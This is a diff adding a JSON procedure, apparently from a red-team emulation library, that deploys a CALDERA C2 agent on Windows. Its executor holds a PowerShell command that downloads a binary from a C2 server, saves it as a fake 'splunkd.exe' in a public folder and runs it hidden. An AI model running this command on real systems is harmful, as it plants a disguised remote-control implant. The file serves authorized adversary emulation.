@@ -1,0 +1,38 @@
+{
+    "name": "Build a CALDERA agent on a windows machine (executing a powershell command)",
+    "uuid": "72a5b9aa-0020-4de9-9609-7611441904b9",
+    "description": "This procedure build a caldera agent for C2 purpose, which communicates through the HTTP(S).",
+    "supported_platforms": [
+        "windows"
+    ],
+    "arguments": {
+        "c2_server_ip": {
+            "description": "The IP address of the C2 server",
+            "type": "string",
+            "default": null
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement":[
+        {
+            "description": "CALDERA should be installed on the C2 server.",
+            "prereq_command": null,
+            "get_prereq_command": null
+        }
+    ],
+    "executor": {
+        "command": "$server=\"http://#{c2_server_ip}:8888\";$url=\"$server/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;",
+        "cleanup_command": null,
+        "type": "Command Executor",
+        "name": "powershell",
+        "elevation_required": false
+    },
+    "side": "Victim",
+    "id": "T1071.001",
+    "tactics": [
+        "Command and Control"
+    ],
+    "technique": "Application Layer Protocol: Web Protocols",
+    "lateral_movement_feature": null,
+    "source": "MANUAL"
+}
